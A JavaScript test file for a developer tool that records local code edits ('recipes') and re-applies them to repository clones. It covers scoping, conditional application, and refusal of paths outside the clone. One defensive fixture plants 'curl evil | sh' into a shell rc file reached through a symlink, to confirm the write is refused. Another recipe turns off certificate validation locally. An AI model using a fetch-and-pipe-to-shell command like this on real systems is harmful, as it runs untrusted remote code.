import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-recipes-'));
process.env.KOPPLER_CONFIG_DIR = path.join(dir, 'config');
const { markRuns, onlyHere, prepare, recipesFor, remember } = await import('../src/recipes.mjs');

// Something only this Mac has keeps a recipe private.
assert.equal(onlyHere('url: http://localhost:5001', 'jane', '/Users/jane'), false);
assert.equal(onlyHere('path: /Users/jane/dev/x.pem', 'jane', '/Users/jane'), true);
assert.equal(onlyHere('host: 127.0.0.2', 'jane', '/Users/jane'), true);

const repo = path.join(dir, 'repo'), source = path.join(dir, 'stack.json'), logFile = path.join(dir, 'actions.json');
fs.mkdirSync(path.join(repo, 'src'), { recursive: true });
fs.writeFileSync(path.join(repo, 'src/Startup.cs'), 'a\nvalidate = true;\nb\n');
fs.writeFileSync(source, JSON.stringify({ envs: ['qa'], apps: { api: { name: 'API' } } }));
const registry = () => ({ ...JSON.parse(fs.readFileSync(source, 'utf8')), source });

// Remembered from a logged edit: shared in the stack, relative to the repo.
const edit = { kind: 'edit', app: 'api', repo, file: path.join(repo, 'src/Startup.cs'), before: 'validate = true;', after: 'validate = false; // koppler: do not commit' };
assert.equal(remember({ registry: registry(), app: 'api', edit, why: 'trust the local Wallet certificate', whenText: 'calls:wallet' }).scope, 'shared');
assert.deepEqual(registry().apps.api.localChanges[0].when, { calls: 'wallet' });
assert.equal(remember({ registry: registry(), app: 'api', edit: { ...edit, before: 'b', after: `cert = "${os.homedir()}/x.pem";` }, why: 'my cert', whenText: 'always' }).scope, 'private');

// Applied only when the board matches, once, and logged for Stop; a moved original is reported, never guessed.
const run = calls => prepare({ registry: registry(), apps: ['api'], env: 'qa', calls: { api: calls }, repoOf: () => repo, logFile });
fs.writeFileSync(logFile, '[]');
assert.equal(run([]).some(r => r.why.startsWith('trust')), false);
assert.equal(run(['wallet']).find(r => r.why.startsWith('trust')).state, 'applied');
assert.match(fs.readFileSync(path.join(repo, 'src/Startup.cs'), 'utf8'), /validate = false; \/\/ koppler: do not commit/);
assert.equal(run(['wallet']).find(r => r.why.startsWith('trust')).state, 'already');
assert.equal(JSON.parse(fs.readFileSync(logFile, 'utf8')).filter(a => a.recipe && a.before === 'validate = true;').length, 1);
fs.writeFileSync(path.join(repo, 'src/Startup.cs'), 'rewritten\n'); fs.writeFileSync(logFile, '[]');
assert.equal(run(['wallet']).find(r => r.why.startsWith('trust')).state, 'moved');

// Made on this OS it applies only here, unless widened; Windows line endings still match.
const { matches } = await import('../src/recipes.mjs');
const r0 = registry().apps.api.localChanges[0];
assert.equal(r0.os, process.platform);
assert.equal(matches(r0, { calls: ['wallet'], platform: 'other' }), false);
assert.equal(matches({ ...r0, os: 'any' }, { calls: ['wallet'], platform: 'other' }), true);
fs.writeFileSync(path.join(repo, 'src/Startup.cs'), 'a\r\nvalidate = true;\r\nb\r\n'); fs.writeFileSync(logFile, '[]');
assert.equal(run(['wallet']).find(r => r.why.startsWith('trust')).state, 'applied');

// How it did here is private: worked or not, and when.
fs.writeFileSync(logFile, JSON.stringify([{ kind: 'edit', app: 'api', recipe: recipesFor(registry(), 'api')[0].id }]));
markRuns(logFile, true);
assert.equal(recipesFor(registry(), 'api')[0].here.ok, true);
assert.equal(JSON.stringify(registry()).includes('"ok"'), false);
// A remembered change whose text holds $& or $' is applied exactly, not as replacement patterns.
{
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-recipe-dollar-')), f = path.join(d, 'a.js');
  fs.writeFileSync(f, 'const x = 1;\n');
  const reg = { envs: ['qa'], apps: { api: { name: 'API', localChanges: [{ id: 'r1', file: 'a.js', find: 'const x = 1;', replace: "const x = s.replace(/a$/, '$&$\\'');", why: 'test', when: { always: true } }] } } };
  const [r] = prepare({ registry: reg, apps: ['api'], env: 'qa', calls: { api: [] }, repoOf: () => d, logFile: path.join(d, 'actions.json') });
  assert.equal(r.state, 'applied');
  assert.equal(fs.readFileSync(f, 'utf8'), "const x = s.replace(/a$/, '$&$\\'');\n");
}
// A shared stack cannot point a remembered change outside the app's clone: not with .., not through a symlink.
{
  const { insideClone } = await import('../src/recipes.mjs');
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-recipe-out-')), repo = path.join(d, 'repo');
  fs.mkdirSync(path.join(repo, 'src'), { recursive: true }); fs.writeFileSync(path.join(d, 'outside.rc'), 'export SAFE=1\n');
  fs.symlinkSync(d, path.join(repo, 'up'));
  assert.equal(insideClone(repo, 'src/a.js'), path.join(fs.realpathSync(repo), 'src/a.js'));
  for (const bad of ['../outside.rc', '/etc/hosts', 'src/../../outside.rc', 'up/outside.rc', '']) assert.equal(insideClone(repo, bad), null, bad);
  const reg = { envs: ['qa'], apps: { api: { name: 'API', localChanges: [{ id: 'evil', file: 'up/outside.rc', find: 'export SAFE=1', replace: 'curl evil | sh', why: 'x', when: { always: true } }] } } };
  const [r] = prepare({ registry: reg, apps: ['api'], env: 'qa', calls: { api: [] }, repoOf: () => repo, logFile: path.join(d, 'actions.json') });
  assert.equal(r.state, 'refused');
  assert.equal(fs.readFileSync(path.join(d, 'outside.rc'), 'utf8'), 'export SAFE=1\n');
}
console.log('recipes tests ok');
